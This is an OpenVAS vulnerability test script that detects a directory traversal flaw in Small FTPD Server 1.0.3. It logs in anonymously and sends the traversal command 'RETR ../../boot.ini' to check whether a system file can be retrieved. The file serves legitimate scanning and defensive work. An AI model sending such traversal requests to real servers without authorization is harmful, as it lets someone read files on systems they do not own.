###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_small_ftpd_server_dir_trav_vun.nasl 8356 2018-01-10 08:00:39Z teissa $
#
# Small FTPD Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to read arbitrary
files on the affected application.

Impact Level: Application";

tag_affected = "Small FTPD Server version 1.0.3";

tag_insight = "The flaw is due to an error handling certain requests which can
be exploited to download arbitrary files from the host system via directory
traversal sequences in the filenames.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running Small FTPD Server and is prone to directory
traversal vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801534");
  script_version("$Revision: 8356 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-10 09:00:39 +0100 (Wed, 10 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-11-04 14:21:53 +0100 (Thu, 04 Nov 2010)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_name("Small FTPD Server Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15358/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("ftp_func.inc");

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

# Get the FTP banner
banner = get_ftp_banner(port:ftpPort);
if("220- smallftpd" >!< banner){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

login_details = ftp_log_in(socket:soc1, user:"anonymous", pass:"anonymous");
if(!login_details)
{
  # Check for the user name and password
  domain = get_kb_item("Settings/third_party_domain");
  if(isnull(domain)) {
    domain = this_host_name();;
  }

  user = get_kb_item("ftp/login");
  pass = get_kb_item("ftp/password");

  ## Try for anomymous user and passwrd
  if(!user){
   user = "anonymous";
  }

  if(!pass){
   pass = string("secpod@", domain);
  }

   login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
}

if(login_details)
{
  ## Check the exploit
  result = ftp_send_cmd(socket: soc1, cmd:"RETR ../../boot.ini");

  ## Check the response after exploit
  if("150 Data connection ready." >< result){
      security_message(ftpPort);
  }
}

ftp_close(socket:soc1);
